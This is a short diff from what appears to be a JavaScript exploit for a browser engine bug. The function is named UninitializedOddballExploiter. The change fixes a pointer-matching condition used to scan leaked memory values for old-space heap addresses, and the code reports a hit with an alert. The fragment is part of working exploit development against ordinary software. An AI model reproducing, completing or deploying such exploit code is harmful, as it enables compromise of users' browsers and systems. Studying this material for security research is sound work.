@@ -246,7 +246,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
                   var [prev_lo, _] = helpers.get_u32_pair();
                   alert(hex(prev_hi)+hex(prev_lo));
                   // if (prev_hi == array_map || prev_lo == array_map) {
-                  if(((prev_hi & old_space == old_space) && (prev_hi & 1 == 1)) || ((prev_lo & old_space == old_space) && (prev_lo & 1 == 1))){
+                  if(((((prev_hi >> 20) << 20) == old_space) && (prev_hi & 1 == 1)) || ((((prev_lo >> 20) << 20) == old_space) && (prev_lo & 1 == 1))){
                       alert("[+]find !");
                       return [i, hi == 2734n ? 0 : 1];
                   }
